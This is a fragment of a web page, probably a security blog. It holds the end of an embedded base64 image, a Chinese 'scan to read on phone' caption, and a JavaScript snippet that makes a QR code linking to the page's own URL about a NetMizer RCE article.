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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-mail-nodeid-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 